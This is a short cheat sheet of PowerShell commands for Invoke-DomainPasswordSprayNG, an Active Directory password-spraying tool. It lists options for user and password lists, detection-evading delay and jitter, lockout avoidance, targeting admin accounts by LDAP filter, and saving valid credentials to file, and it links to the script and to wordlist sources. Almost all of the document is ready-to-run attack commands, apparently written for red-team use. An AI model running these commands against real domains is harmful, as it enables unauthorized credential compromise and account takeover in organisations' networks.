# Domain Password Spray

## Commands

```powershell
# Don't get prompted 
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -Force

# One user, one password
Invoke-DomainPasswordSprayNG -Username "Administrator" -Password "Password123" -Domain "test.local"

# User list and one password
Invoke-DomainPasswordSprayNG -UserList users.txt -Password "Password123" -Domain "test.local"

# One user, password list
Invoke-DomainPasswordSprayNG -Username "Administrator" -PasswordList passwords.txt -Domain "test.local"

# Log only successful tries
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -LogLevel Quiet

# Log all tries
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -LogLevel Normal

# Log all tries with verbose output
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -LogLevel Verbose

# Log to file path
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -LogToFile -LogFilePath "spray.log"

# Save valid creds to file path
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -OutFile "valid-creds.txt"

# Status updates in x seconds
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -StatusUpdateInterval 1

# Add delay between attempts in x seconds
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -Delay 2

# Add jitter to delay (0-1 range for random variation)
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -Delay 5 -Jitter 0.5

# Extra wait time between rounds in seconds
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -Fudge 15

# Username as password
Invoke-DomainPasswordSprayNG -UserList users.txt -UsernameAsPassword

# Continue testing after finding valid credentials
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -ContinueOnSuccess

# Custom LDAP filter
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -Filter "(description=*admin*)"

# Full featured command
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -Domain "test.local" -LogLevel Verbose -LogToFile -LogFilePath "spray.log" -OutFile "valid-creds.txt" -Delay 5 -Jitter 0.3 -StatusUpdateInterval 30 -ContinueOnSuccess -Force

# Additional built-in user filtering options
Invoke-DomainPasswordSprayNG -UserList users.txt -PasswordList passwords.txt -RemoveDisabled -RemovePotentialLockouts
```

### Documentation
https://github.com/agnorance/fishing/blob/main/scripts/active-directory/DomainPasswordSprayNG.ps1

### Lists
https://github.com/danielmiessler/SecLists
https://weakpass.com/